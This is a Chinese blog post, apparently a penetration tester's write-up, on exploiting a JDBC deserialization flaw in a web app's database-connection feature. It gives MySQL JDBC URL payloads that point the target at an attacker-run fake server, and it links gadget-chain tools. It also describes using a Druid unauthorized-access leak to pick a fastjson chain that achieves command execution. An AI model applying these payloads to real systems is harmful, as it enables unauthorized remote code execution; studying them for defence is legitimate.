> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkwOTIzODg0MA==&mid=2247491280&idx=1&sn=86a1cb364f0a376f612cac439af73f16

#  一次JDBC反序列化漏洞  
 爱喝酒烫头的曹操   2025-07-06 01:59  
  
在一次测试中遇到了数据库连接功能，这种功能点一般会存在jdbc反序列化漏洞。  
  
特征点：  
  
这种数据库连接点一般会存在jdbc反序列化漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRImMNCIOvuN6toPOus15qZcKgicIdPB82jSCtDkJf9nBM9zS51xnkLLWA/640?wx_fmt=png&from=appmsg "")  
  
  
打法：  
  
先试试打h2不出网利用链。该利用链需要对方服务器导入了h2依赖包才能打。执行ping dnslog命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRICkoTDFUUg0wzvgGicLQEh7xXWs2qwD4cAicIGeKYxbAvza6REwyQGQFw/640?wx_fmt=png&from=appmsg "")  
  
然后测试连接，发送请求，看起来并没有收到dnslog请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRI2kvjykt1snpHe4ahPv74x72sZaFk6e3C0PSRibBUyGiaichjBFZta6Ggw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIcdj2u45M3M5rLbecDhVS3aBnhzCCD7h9lpG8JUE6TJiaphAPlyFQnPw/640?wx_fmt=png&from=appmsg "")  
  
  
那就换着打常规的出网利用链。需要用到这个工具。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIpfxaePTbtSs7Gl6CenZJSztwIH0OeAgJUzuE8hMeCGs9Ficp4hrMwvg/640?wx_fmt=png&from=appmsg "")  
  
下载地址：https://github.com/4ra1n/mysql-fake-server/  
  
打个dnslog链，探测是否存在反序列化漏洞。  
  
  
先在自己的vps起一个服务  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRItiaQ7xgZJ4Pjs127z0Z3bl3JVxVl059mcBQ6pRhoqGra97sCErb6wsw/640?wx_fmt=png&from=appmsg "")  
  
在url处写入(目标服务器JDBC Version6.x时使用)  
  
jdbc:mysql://ip:port/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor  
  
（目标服务器JDBC Version8.x时使用)  
  
jdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor  
  
  
用户名处写入要打的urldns地址，密码可以随便写  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRI5vRpYsFqyIzViahbGMkxzApabUHf8mZdtXFEUZiaOkZqeu9HMjsZ2yUQ/640?wx_fmt=png&from=appmsg "")  
  
VPS成功收到请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIybrzZYWfxZl5oJtXnHLOzF4hgRO8gqt6wSt2oiaN651eLia6lQ8Ze1KA/640?wx_fmt=png&from=appmsg "")  
  
dnslog收到回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRI8Yv1Uc94icicNltU9E8OLuua2GTejf6lIw8mVLEzLpJLLu6YaJA13xpA/640?wx_fmt=png&from=appmsg "")  
  
接下来可以试试打可以执行命令的链，例如cc链，cb链等。  
  
但是试了几个下来都没有成功执行命令，就是说目标服务器可能没有导入对应的依赖。（过程省略）  
  
  
刚好bp插件帮我扫到了druid未授权漏洞，可以通过druid未授权看看服务器里的组件有什么，就可以判断打什么链了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIWNQtd992s7gMHGZq1bA9YgBd7khPMCftFBOklib04Pj1axNUU6jgw6g/640?wx_fmt=png&from=appmsg "")  
  
  
服务器导入的是commons-collections-3.2.2.jar版本，相较于之前的版本增加了一个安全检查，所以没办法直接打cc链。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIOWubux9cVJrTJiaDKzV5wsG7zCAyJMBBlXUMibBBpEEJDvPb4KsbxARg/640?wx_fmt=png&from=appmsg "")  
  
目标服务器还有c3p0，但是这个链不太好打jdbc反序列化，需要的前置条件比较多。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIUa21oTY519LXLk3y2c4zpPibibcrxKDuJKgD0KA43B2Oh1AOj9lZUWgg/640?wx_fmt=png&from=appmsg "")  
  
又发现了目标服务器使用了fastjson，看来可以直接打fastjson链了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIz03uUSIdsffJjcxednO7zHzp3cacZliadTsbng47p2yViaI4qqjQdD4g/640?wx_fmt=png&from=appmsg "")  
  
  
使用工具生成fastjson链，执行ping命令  
  
https://github.com/Lotus6/ysoserial  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIiaicQd4x9MZW5vO4BSMeMjOYDrbxF8SHrBEIExMgdD6ficmFaT8yWIxibA/640?wx_fmt=png&from=appmsg "")  
  
  
将base64编码的payload在vps上，这里我放到了test文件里  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIV1MW1kTtPsicTp04W180ysZrB7jqUxrZYYUnYicczcFWcdw1npRL7fvQ/640?wx_fmt=png&from=appmsg "")  
  
  
通过命令再次启动服务  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIwJjpB4GgSSY1PlW7WsiaqFxNEicjQaIqcgYMrSq8twAKFoWZ4tE0qleQ/640?wx_fmt=png&from=appmsg "")  
  
再次创建数据库连接，将用户名处改为deser_CUSTOM  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIYrcyLufCxDZXX5cdicj8qDzJKREz8RK0DVsPYj3HUeco0Q9NFwbafHg/640?wx_fmt=png&from=appmsg "")  
  
  
成功执行ping命令，拿下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIcwrGsmEwrQzyDLKwnF1VgIpNweljLvPRkic9XRiaDd4wPdr8hvV7Q2MA/640?wx_fmt=png&from=appmsg "")  
  
  
补充：  
  
如果目标没有druid未授权，那么怎么知道目标服务器有什么链可以打呢？  
  
可以通过urldns链判断目标有什么利用链，如果存在某个指定的类，就进行dnslog请求，从而判断服务器有什么链，具体原理这里不细讲，有兴趣的可以看这个文章了解。  
  
https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA  
  
我们可以用珂师傅的工具  
  
https://github.com/kezibei/Urldns  
  
通过该工具生成base64编码的payload  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIXZblBKUWUAoTk6s3aojk6icHDeJibAzYTF6IEyffafwybTic9WWsEYUYQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIw1twj4hgTO7lho4iaQvYU7OZ9s2oHJ7mrCb9o9zMx3UqpCLia9j42cKA/640?wx_fmt=png&from=appmsg "")  
  
和刚才的步骤相同，放到vps上面，过程省略。成功把目标服务器信息回显出来。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIsFaEDIAqtEaibPCfv6ZicibHq0PpGTic6QQuduibAF7fuUz9lwa6FE5mPBw/640?wx_fmt=png&from=appmsg "")  
  
  
